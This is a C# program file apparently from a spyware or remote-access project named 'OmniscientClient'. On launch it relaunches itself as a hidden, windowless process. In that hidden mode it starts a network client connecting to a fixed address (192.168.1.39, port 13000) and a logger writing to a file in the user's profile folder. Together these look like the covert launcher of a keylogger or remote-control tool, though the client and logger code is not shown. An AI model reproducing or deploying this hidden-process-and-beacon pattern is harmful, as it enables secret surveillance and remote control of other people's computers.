using System.Diagnostics;

namespace OmniscientClient
{
    static class Program
    {
        static private string clientFolderPath = $@"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\";
        static private string lockFilePath = Path.Combine(Path.GetTempPath(), "OmniscientClient.lock");

        static void Main(string[] args)
        {   
            

            if (args.Length == 0)
            {
                // Create lock file
                if (!File.Exists(lockFilePath))
                {
                    File.Create(lockFilePath).Close();
                }

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = "dotnet",
                    Arguments = System.Reflection.Assembly.GetExecutingAssembly().Location + " hidden",
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(startInfo);
            }
            else if (args.Length > 0 && args[0] == "hidden")
            {
                Client client = new Client("192.168.1.39", 13000);
                Logger logger = new Logger(clientFolderPath + "log.txt");
                client.Start();
                logger.Start();
            }

            // Delete lock file when the application closes
            if (File.Exists(lockFilePath))
            {
                File.Delete(lockFilePath);
            }
        }
    }
}